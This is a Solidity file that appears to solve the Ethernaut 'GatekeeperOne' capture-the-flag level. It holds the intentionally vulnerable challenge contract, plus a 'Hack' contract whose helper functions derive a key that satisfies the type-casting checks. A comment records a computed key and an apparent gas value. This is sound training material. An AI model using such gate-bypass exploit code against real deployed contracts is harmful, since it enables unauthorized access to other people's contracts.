// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../node_modules/hardhat-console/contracts/console.sol";

library SafeMath {

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/**
Make it past the gatekeeper and register as an entrant to pass this level.

Things that might help:
Remember what you've learned from the Telephone and Token levels.
You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
**/
contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "Gate1 failed");
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0, "Gate2 failed");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

interface GatekeeperI {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Hack {

  GatekeeperI gate;

  constructor(address _add) public {
    gate = GatekeeperI(_add);
  }

  function partAllA(bytes8 _gateKey) public pure returns(uint) {
    return uint32(uint64(_gateKey));
  }

  function part1B(uint _gateKey) public pure returns(uint) {
    return uint16(uint64(_gateKey));
  }

  function part2B(uint _gateKey) public pure returns(uint) {
    return uint64(_gateKey);
  }

  function part4B(uint _gateKey) public pure returns(uint) {
    return uint32(_gateKey);
  }
  
  function part3B() public view returns(uint) {
    return uint16(msg.sender);
  }
  
  function getKeyBytes(uint key) public pure returns(bytes8) {
    return bytes8(uint64(key));
  }

  function hack(bytes8 _gateKey) public {
    gate.enter(_gateKey);
  }

  //0x100000000000ddc4
  // 850529
}